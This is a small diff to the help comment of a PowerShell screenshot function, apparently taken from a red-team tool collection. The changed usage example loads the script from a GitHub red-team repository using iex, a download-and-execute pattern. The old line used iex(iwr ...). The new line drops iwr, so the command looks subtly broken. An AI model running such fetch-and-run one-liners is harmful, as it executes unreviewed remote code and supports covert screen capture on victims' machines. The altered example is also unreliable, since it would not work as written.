@@ -2,7 +2,7 @@ Function Take-ScreenShot {
     <#   
 .SYNOPSIS   
     Used to take a screenshot of the desktop or the active window.
-    iex(iwr https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Take-Screenshot.ps1);Take-ScreenShot -screen -file "C:\image.png" -imagetype png
+    iex(https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot.ps1);Take-ScreenShot -screen -file "C:\image.png" -imagetype png
 .DESCRIPTION   
     Used to take a screenshot of the desktop or the active window and save to an image file if needed. 
 .PARAMETER screen 
